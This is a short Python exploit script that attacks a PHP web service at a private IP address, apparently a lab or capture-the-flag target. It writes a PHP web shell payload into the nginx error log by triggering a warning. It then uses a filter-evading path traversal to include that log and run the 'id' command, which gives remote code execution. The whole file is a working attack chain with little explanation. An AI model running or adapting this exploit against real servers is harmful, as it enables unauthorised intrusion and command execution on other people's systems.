import socket, time, re

HOST = "10.0.185.128"
PORT = 80

def raw_req(path, timeout=10):
    s = socket.create_connection((HOST, PORT), timeout=5)
    req = f"GET {path} HTTP/1.1\r\nHost: {HOST}\r\nUser-Agent: curl/8.18.0\r\nConnection: close\r\n\r\n"
    s.sendall(req.encode('latin1'))
    data = b""
    s.settimeout(timeout)
    try:
        while True:
            chunk = s.recv(65536)
            if not chunk:
                break
            data += chunk
    except socket.timeout:
        pass
    s.close()
    return data.decode('latin1', errors='replace')

# Step 1: trigger PHP warning with quote-free, space-free payload in query
# lang[]=1 -> substr() warning; request line gets logged to error.log with our payload
payload = "<?php system($_GET[c]);?>"
p1 = f"/services.php?lang[]=1&c={payload}"
r1 = raw_req(p1)
print("== poison req status:", r1.split("\r\n")[0])

time.sleep(1)

# Step 2: include error.log via LFI with c=id
p2 = "/services.php?lang=....//....//....//....//....//....//var/log/nginx/error.log&c=id"
r2 = raw_req(p2)
body = r2.split("\r\n\r\n", 1)[1] if "\r\n\r\n" in r2 else r2
m = re.findall(r'uid=\d+\([^)]*\)[^<\n]*', body)
print("== UID matches:", m[:5] if m else "NONE")
if not m:
    # show chunk around our payload execution
    idx = body.find("system(")
    print("--- around payload ---")
    print(body[max(0,idx-200):idx+500] if idx>=0 else body[-800:])
